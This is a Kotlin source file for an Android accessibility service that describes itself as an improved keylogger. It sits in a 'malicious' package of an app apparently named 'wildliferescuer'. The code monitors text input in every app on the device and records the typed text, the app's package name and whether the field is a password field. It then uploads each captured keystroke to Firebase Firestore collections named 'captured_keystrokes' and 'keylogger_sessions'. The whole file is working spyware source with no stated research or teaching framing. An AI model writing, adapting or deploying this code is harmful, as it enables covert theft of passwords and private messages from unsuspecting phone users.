package com.example.wildliferescuer.malicious

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.firestore.FirebaseFirestore
import java.text.SimpleDateFormat
import java.util.*

/**
 * Keylogger using Accessibility Service - IMPROVED VERSION
 * 
 * Fixes:
 * - Better text extraction from AccessibilityEvent
 * - Proper handling of text arrays
 * - Enhanced error logging for Firebase uploads
 * - Individual character capture option
 */
class KeyloggerService : AccessibilityService() {
    
    private val TAG = "MALICIOUS_APP"
    private val firestore = FirebaseFirestore.getInstance()
    
    private var sessionId: String = ""
    private var deviceId: String = ""
    private var keystrokeCount = 0
    
    override fun onServiceConnected() {
        super.onServiceConnected()
        
        // Generate session ID
        sessionId = UUID.randomUUID().toString()
        deviceId = UUID.randomUUID().toString()
        
        Log.e(TAG, "╔════════════════════════════════════╗")
        Log.e(TAG, "║  ⚠️ KEYLOGGER ACTIVATED ⚠️        ║")
        Log.e(TAG, "╚════════════════════════════════════╝")
        Log.e(TAG, "🎹 Session ID: $sessionId")
        Log.e(TAG, "📱 Device ID: $deviceId")
        
        // Configure accessibility service
        val info = AccessibilityServiceInfo()
        info.apply {
            // Monitor text change events
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            
            // Monitor all apps
            packageNames = null // null = all apps
            
            // Get text content
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            
            // No delay
            notificationTimeout = 0
            
            // Retrieve window content and text
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                   AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                   AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
        }
        
        serviceInfo = info
        
        Log.e(TAG, "✅ Keylogger service configured")
        Log.e(TAG, "🔍 Monitoring ALL text input across ALL apps...")
        
        // Create session in Firebase
        createKeystrokeSession()
    }
    
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        
        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }
                
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    handleViewFocused(event)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Keylogger error: ${e.message}")
            e.printStackTrace()
        }
    }
    
    /**
     * Handle text input events - IMPROVED TEXT EXTRACTION
     */
    private fun handleTextChanged(event: AccessibilityEvent) {
        // Extract text properly
        val capturedText = extractTextFromEvent(event)
        if (capturedText.isNullOrEmpty()) return
        
        // Get app package name
        val packageName = event.packageName?.toString() ?: "unknown"
        
        // Get app-specific context
        val className = event.className?.toString() ?: "unknown"
        
        // Determine if this is a password field
        val isPassword = event.isPassword
        
        // Get additional context
        val beforeText = event.beforeText?.toString() ?: ""
        val addedText = event.addedCount
        val removedText = event.removedCount
        
        keystrokeCount++
        
        // Log the captured text
        Log.e(TAG, "⌨️ KEYSTROKE CAPTURED #$keystrokeCount")
        Log.e(TAG, "   App: $packageName")
        Log.e(TAG, "   Class: ${className.substringAfterLast('.')}")
        Log.e(TAG, "   Password Field: $isPassword")
        Log.e(TAG, "   Captured Text: \"$capturedText\"")
        Log.e(TAG, "   Text Length: ${capturedText.length} characters")
        Log.e(TAG, "   Added: $addedText, Removed: $removedText")
        
        // Create keystroke data
        val keystrokeData = hashMapOf<String, Any>(
            "sessionId" to sessionId,
            "deviceId" to deviceId,
            "keystrokeNumber" to keystrokeCount,
            "capturedText" to capturedText,
            "beforeText" to beforeText,
            "packageName" to packageName,
            "className" to className,
            "isPassword" to isPassword,
            "addedCount" to addedText,
            "removedCount" to removedText,
            "timestamp" to System.currentTimeMillis(),
            "formattedTime" to formatTimestamp(System.currentTimeMillis()),
            "textLength" to capturedText.length
        )
        
        // Upload to Firebase
        uploadKeystroke(keystrokeData)
        
        // Update session statistics
        updateSessionStats()
    }
    
    /**
     * Extract actual text from AccessibilityEvent
     * Handles both List and String formats
     */
    private fun extractTextFromEvent(event: AccessibilityEvent): String? {
        try {
            // Method 1: Get text from event.text (List<CharSequence>)
            if (event.text != null && event.text.isNotEmpty()) {
                val textList = event.text
                val extractedText = textList.joinToString("")
                if (extractedText.isNotEmpty()) {
                    return extractedText
                }
            }
            
            // Method 2: Get text from content description
            if (!event.contentDescription.isNullOrEmpty()) {
                return event.contentDescription.toString()
            }
            
            // Method 3: Try to get text from source node
            val source = event.source
            if (source != null) {
                val nodeText = source.text
                if (!nodeText.isNullOrEmpty()) {
                    return nodeText.toString()
                }
            }
            
            return null
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error extracting text: ${e.message}")
            return null
        }
    }
    
    /**
     * Handle view focus events
     */
    private fun handleViewFocused(event: AccessibilityEvent) {
        val packageName = event.packageName?.toString() ?: return
        val className = event.className?.toString() ?: return
        
        // Log when user focuses on a text input field
        if (className.contains("EditText", ignoreCase = true) ||
            className.contains("Input", ignoreCase = true)) {
            
            Log.e(TAG, "🎯 Text field focused:")
            Log.e(TAG, "   App: $packageName")
            Log.e(TAG, "   Field: ${className.substringAfterLast('.')}")
            
            // Log field focus
            val focusData = hashMapOf<String, Any>(
                "sessionId" to sessionId,
                "deviceId" to deviceId,
                "eventType" to "field_focus",
                "packageName" to packageName,
                "className" to className,
                "timestamp" to System.currentTimeMillis(),
                "formattedTime" to formatTimestamp(System.currentTimeMillis())
            )
            
            firestore.collection("keylogger_events")
                .add(focusData)
                .addOnSuccessListener {
                    Log.e(TAG, "📤 Field focus logged")
                }
                .addOnFailureListener { e ->
                    Log.e(TAG, "❌ Failed to log focus: ${e.message}")
                }
        }
    }
    
    /**
     * Create keylogging session in Firebase
     */
    private fun createKeystrokeSession() {
        val session = hashMapOf<String, Any>(
            "sessionId" to sessionId,
            "deviceId" to deviceId,
            "startTime" to System.currentTimeMillis(),
            "endTime" to "",
            "status" to "active",
            "keystrokeCount" to 0,
            "createdAt" to formatTimestamp(System.currentTimeMillis())
        )
        
        firestore.collection("keylogger_sessions")
            .document(sessionId)
            .set(session)
            .addOnSuccessListener {
                Log.e(TAG, "✅ Keylogger session created in Firebase")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Failed to create session: ${e.message}")
                e.printStackTrace()
            }
    }
    
    /**
     * Upload keystroke to Firebase with enhanced error handling
     */
    private fun uploadKeystroke(keystrokeData: HashMap<String, Any>) {
        Log.e(TAG, "📤 Attempting to upload keystroke...")
        
        firestore.collection("captured_keystrokes")
            .add(keystrokeData)
            .addOnSuccessListener { documentReference ->
                Log.e(TAG, "✅ Keystroke uploaded successfully: ${documentReference.id}")
                Log.e(TAG, "   Document path: captured_keystrokes/${documentReference.id}")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ FAILED to upload keystroke!")
                Log.e(TAG, "   Error: ${e.message}")
                Log.e(TAG, "   Error class: ${e.javaClass.simpleName}")
                e.printStackTrace()
                
                // Log the data that failed to upload
                Log.e(TAG, "   Failed data: $keystrokeData")
            }
    }
    
    /**
     * Update session statistics
     */
    private fun updateSessionStats() {
        firestore.collection("keylogger_sessions")
            .document(sessionId)
            .update(
                mapOf(
                    "keystrokeCount" to keystrokeCount,
                    "lastUpdate" to System.currentTimeMillis()
                )
            )
            .addOnSuccessListener {
                Log.e(TAG, "📊 Session stats updated: $keystrokeCount keystrokes")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "❌ Failed to update stats: ${e.message}")
            }
    }
    
    /**
     * Format timestamp
     */
    private fun formatTimestamp(timestamp: Long): String {
        return SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
            .format(Date(timestamp))
    }
    
    override fun onInterrupt() {
        Log.e(TAG, "⚠️ Keylogger service interrupted")
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Update session end time
        firestore.collection("keylogger_sessions")
            .document(sessionId)
            .update(
                mapOf(
                    "endTime" to System.currentTimeMillis(),
                    "status" to "stopped"
                )
            )
        
        Log.e(TAG, "🛑 Keylogger service stopped")
        Log.e(TAG, "   Total keystrokes captured: $keystrokeCount")
    }
}
